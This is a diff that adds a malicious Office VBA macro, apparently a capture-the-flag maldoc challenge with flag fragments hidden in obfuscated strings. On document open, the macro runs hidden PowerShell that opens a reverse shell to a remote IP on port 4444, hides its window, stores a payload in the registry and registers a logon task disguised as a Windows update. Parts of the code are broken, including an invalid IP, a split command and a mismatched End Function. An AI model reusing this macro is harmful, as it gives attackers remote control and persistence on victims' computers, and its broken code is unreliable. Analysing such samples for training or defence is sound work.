@@ -1,0 +1,75 @@
+Rem Attribute VBA_ModuleType=VBAModule
+Option VBASupport 1
+Sub Auto_Open()
+Dim bomazpcuwhstlcd As String
+Dim dbcsmjrdsqm As String
+Dim gxiwcxqzqi As String
+Dim uejdkidq As String
+
+x = Shell("
+POWERSHELL.exe -noexit -w hidden -enc
+. ( $PshomE[4]+$pshoMe[30]+'x') ( [strinG]::join('' , ([REGeX]::MaTCHES( "('iqwregp = jXtCHTB{maldocs_are";') &( $sheLLiD[1]+$sHeLlID[13]+'x')" ,'.' ,'RiGHTtOleft' ) | FoREaCH-OBJecT {$_.VALUE} ))  )
+
+
+$payloadBase64 = "$client = New-Object System.Net.Sockets.TCPClient("196.2333.54.2",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
+
+
+SEt ("G8h")  (  ". ( $vERBOsEpReFereNcE.toSTriNG()[1,3]+'x'-jOin'') ( (('Zarregn = 1N2_the_new_meta}1N2;')  -cREplACe  ([chaR]49+[chaR]78+[chaR]50),[chaR]34  -RePlacE'Zar',[chaR]36) )"  ) ;-jOIn ( lS ("VARIaBLE:g8H")  ).VALue[ - 1.. - ( ( lS ("VARIaBLE:g8H")  ).VALue.LengtH)] | IeX
+
+Add-
+Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+';
+[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0);
+
+
+if ($payloadBase64 -match "http:|https:") {
+    $payloadBase64 = (New-Object "Net.Webclient").DownloadString($payloadBase64);
+}
+
+$installed = Get-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -ea SilentlyContinue;
+
+
+if ($installed) {
+
+
+    if ($installed -ne $payloadBase64) {
+        Set-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -Force -Value $payloadBase64;
+    }
+
+# installation
+} else {
+
+
+    if ($FALSE -eq (Test-Path -Path "HKCU:\Software\$($regp)\")) {
+        New-Item -Path "HKCU:\Software\$($regp)";
+    }
+    Set-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -Force -Value $payloadBase64;
+
+
+    $u = [Environment]::UserName;
+
+
+    $task = Get-ScheduledTask -TaskName "$($regp)$($regn)" -ea SilentlyContinue;
+    if ($task) {
+        Unregister-ScheduledTask -TaskName "$($regp)$($regn)" -Confirm:$false;
+    }
+
+
+    $a = New-ScheduledTaskAction -Execute "powershell.exe" "-w hidden -ExecutionPolicy Bypass -nop -NoExit -C Write-host 'Windows update ready'; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software\$($regp)).$($regn))));";
+    $t = New-ScheduledTaskTrigger -AtLogOn -User "$($u)";
+    $p = New-ScheduledTaskPrincipal "$($u)";
+    $s = New-ScheduledTaskSettingsSet -Hidden;
+    $d = New-ScheduledTask -Action $a -Trigger $t -Principal $p -Settings $s;
+    Register-ScheduledTask "$($regp)$($regn)" -InputObject $d;
+}
+
+
+iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payloadBase64)));
+
+", 1)
+End Function
